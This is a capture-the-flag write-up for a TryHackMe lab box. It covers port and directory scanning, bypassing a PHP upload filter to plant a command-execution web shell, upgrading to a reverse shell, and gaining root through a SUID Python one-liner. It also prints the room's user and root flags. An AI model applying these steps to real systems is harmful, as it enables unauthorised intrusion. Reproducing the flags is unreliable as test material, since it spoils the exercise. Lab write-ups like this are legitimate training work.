### Completed 2242 10 JAN 22
### d0nkeyk0ng787/gnome787

### Box IP - 10.10.140.72

# Intro

This is a easy level CTF room on the site tryhackme. 

# Enumeration

### NMAP

Starting with a basic nmap scan
 - nmap -sC -sV 10.10.140.72 -oN nmap/initial
	
Ports
 - 22 SSH
 - 80 HTTP

Going to run a more in depth nmap scan
- nmap-A -vv 10.10.140.72 -oN nmap/deep

I am also going to run an all ports scan seperately as that will take some time to run through
- nmap -p- 10.10.140.72 -oN nmap/allports

Running a gobuster scan
- gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.140.72 -x php -o gobuster.out

Our gobuster scan returns /panel/ as a hidden directory

It appears to be a place we can upload a shell to


# Exploitation

### Uploading a shell

Now that we have a file upload page, we can try and upload a reverse shell

It seems that off the bat php is prohibited. Going to try and change the file extension to see if that will circumvent the block

I was able to get the shell onto the site however, it wouldn't run. Instead I was able to get some php code onto the target machine that would allow me to run commands from the URL on the system and using this I was able to generate a shell

Unfortunately this wasn't straight forward as I couldn't seem to generate a bash shell that easily. In the end I was able to use a python encoded shell to get access

That payload can be found here: https://robertscocca.medium.com/%EF%B8%8F%EF%B8%8F-rce-to-shell-techniques-696e55b23fee


# Post Exploitation

To start with it's important to upgrade the shell
- python -c 'import pty; pty.spawn("/bin/bash")'
- stty raw -echo; fg

Now that's done, we can grab the user flag

This just took a little look around but was accessible with my current permissions

User Flag: THM{y0u_g0t_a_sh3ll}

# Privilege Escalation

Starting off with to see if there are any programs the user can run as sudo
- sudo -l

This yields nothing so will try find a SUID exploit path
- find / -type f -perm -04000 -ls 2>/dev/null

Taking a look at the results we see python there which is interesting as this is probably an attack vector

Checking GTFOBins we see there is an exploit payload we can use

Simply adjust it so it looks like so
- /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

Now we have root

Root Flag: THM{pr1v1l3g3_3sc4l4t10n}
